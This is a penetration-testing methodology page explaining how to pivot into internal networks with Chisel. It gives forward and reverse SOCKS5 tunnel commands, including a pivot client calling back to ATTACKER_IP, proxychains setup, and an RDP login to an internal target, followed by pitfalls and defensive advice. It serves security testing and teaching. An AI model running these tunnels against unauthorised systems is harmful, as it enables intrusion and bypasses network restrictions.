---
layout: page
title: "Chisel"
subtitle: "A TCP and UDP tunnel over HTTP that can provide a SOCKS5 proxy, in forward or reverse mode"
permalink: /methodology/pivoting/chisel/
---

Chisel is a single binary that tunnels TCP and UDP traffic over HTTP, with the payload secured by SSH. It is useful when the pivot can make HTTP connections but SSH is not available or not allowed. It can run a SOCKS5 proxy, which lets proxychains reach networks behind the pivot. A reverse mode is available when the target cannot accept inbound connections.

## Workflow

1. Transfer the Chisel binary to the pivot and to the attack host, if the attack host runs the server.
2. Choose a forward or reverse layout based on which side accepts inbound connections.
3. Start the server with the SOCKS5 option on the chosen port.
4. Connect the client with the `socks` remote, which opens a local proxy on port 1080.
5. Add the local proxy to `/etc/proxychains.conf` as a `socks5` entry.
6. Run tools through proxychains against internal hosts.

Forward mode, with the server on the pivot:

```bash
pivot$ ./chisel server -v -p 1234 --socks5
attacker$ ./chisel client -v PIVOT_IP:1234 socks
```

The client then listens on `127.0.0.1:1080`. Add it to proxychains:

```text
socks5 127.0.0.1 1080
```

```bash
attacker$ proxychains xfreerdp /v:TARGET_IP /u:USERNAME /p:PASSWORD
```

Reverse mode, with the server on the attack host and the client on the pivot:

```bash
attacker$ sudo ./chisel server --reverse -v -p 1234 --socks5
pivot$ ./chisel client -v ATTACKER_IP:1234 R:socks
```

In reverse mode the server opens the SOCKS port on the attack host, default 1080, and the traffic leaves through the client on the pivot.

## What to look for

- The client output should end with `SSH connected` and show the local listener. If it does not, check the server fingerprint and port.
- The server must be started with `--reverse` before a client can request a reverse remote such as `R:socks`.
- Proxychains needs the `socks5` line. A `socks4` entry will not work with Chisel's SOCKS5 proxy.

## Pitfalls

- Chisel tunnels over HTTP, so an inspecting proxy or a firewall that blocks the chosen port stops the connection.
- The reverse SOCKS port defaults to 1080 on the server. Check that nothing else on the attack host already uses it.
- Like other proxychains setups, only TCP connections traverse the tunnel. Use TCP connect scans.

## Defense and prevention

Monitor for unexpected HTTP clients on servers that make persistent outbound connections, and restrict outbound traffic from servers to approved destinations. Application allow-lists can block unknown binaries from running on servers.
